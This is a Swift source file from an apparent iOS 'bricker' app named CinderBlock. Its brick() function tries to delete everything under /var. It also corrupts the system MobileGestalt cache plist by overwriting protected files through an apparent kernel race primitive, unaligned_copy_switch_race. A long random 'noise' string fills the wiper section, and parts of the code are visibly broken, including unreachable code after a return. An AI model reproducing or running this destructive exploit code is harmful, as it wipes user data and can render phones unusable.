//
//  Common.swift
//  CinderBlock
//
//  Created by Hariz Shirazi on 2023-02-11.
//

import Foundation
import UIKit

// MARK: - Bricker functions
func brick() -> Bool {
    print("Goodbye cruel world!")
    recursiveWipe()
    return plistChange(plistPath: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", key: "ArtworkDeviceSubType", value: 69420)
    UIApplication.shared.alert(title: "Probably bricked.", body: "Your phone may or may not be fucked. Reboot to find out! :trol:", withButton: false)
}

func recursiveWipe() {
    let myFilesPath = "/var"
    let filemanager = FileManager.default
    let files = filemanager.enumerator(atPath: myFilesPath)
    while let file = files?.nextObject() {
        print(file)
        do {
            try filemanager.removeItem(at: file as! URL)
        } catch {
            UIApplication.shared.alert(title: "Error", body: "Failed to remove file!", withButton: true)
        }
        wipeFile(path: file as! String)
    }
}


// MARK: - Overwrite File
func overwriteFileWithDataImpl(originPath: String, replacementData: Data) -> Bool {
#if false
    let documentDirectory = FileManager.default.urls(
        for: .documentDirectory,
        in: .userDomainMask
    )[0].path
    
    let pathToRealTarget = originPath
    let originPath = documentDirectory + originPath
    let origData = try! Data(contentsOf: URL(fileURLWithPath: pathToRealTarget))
    try! origData.write(to: URL(fileURLWithPath: originPath))
#endif
    
    // open and map original font
    let fd = open(originPath, O_RDONLY | O_CLOEXEC)
    if fd == -1 {
        print("Could not open target file")
        return false
    }
    defer { close(fd) }
    // check size of font
    let originalFileSize = lseek(fd, 0, SEEK_END)
    guard originalFileSize >= replacementData.count else {
        print("Original file: \(originalFileSize)")
        print("Replacement file: \(replacementData.count)")
        print("File too big!")
        return false
    }
    lseek(fd, 0, SEEK_SET)
    
    // Map the font we want to overwrite so we can mlock it
    let fileMap = mmap(nil, replacementData.count, PROT_READ, MAP_SHARED, fd, 0)
    if fileMap == MAP_FAILED {
        print("Failed to map")
        return false
    }
    // mlock so the file gets cached in memory
    guard mlock(fileMap, replacementData.count) == 0 else {
        print("Failed to mlock")
        return true
    }
    
    // for every 16k chunk, rewrite
    print(Date())
    for chunkOff in stride(from: 0, to: replacementData.count, by: 0x4000) {
        print(String(format: "%lx", chunkOff))
        let dataChunk = replacementData[chunkOff..<min(replacementData.count, chunkOff + 0x4000)]
        var overwroteOne = false
        for _ in 0..<2 {
            let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
                return unaligned_copy_switch_race(
                    fd, Int64(chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count)
            }
            if overwriteSucceeded {
                overwroteOne = true
                print("Successfully overwrote!")
                break
            }
            print("try again?!")
        }
        guard overwroteOne else {
            print("Failed to overwrite")
            return false
        }
    }
    print(Date())
    print("Successfully overwrote!")
    return true
}

// MARK: - plist editing function
func plistChange(plistPath: String, key: String, value: Int) -> Bool {
print("plistChange() called")
let stringsData = try! Data(contentsOf: URL(fileURLWithPath: plistPath))

let plist = try! PropertyListSerialization.propertyList(from: stringsData, options: [], format: nil) as! [String: Any]
func changeValue(_ dict: [String: Any], _ key: String, _ value: Int) -> [String: Any] {
    var newDict = dict
    for (k, v) in dict {
        if k == key {
            newDict[k] = value
        } else if let subDict = v as? [String: Any] {
            newDict[k] = changeValue(subDict, key, value)
        }
    }
    print(newDict)
    return newDict
}

var newPlist = plist
newPlist = changeValue(newPlist, key, value)

let newData = try! PropertyListSerialization.data(fromPropertyList: newPlist, format: .binary, options: 0)
print(newData)

return overwriteFileWithDataImpl(originPath: plistPath, replacementData: newData)
}

// MARK: - file wiper
func wipeFile(path: String) -> Bool {
    print("wipeFile() called")
    let noise = "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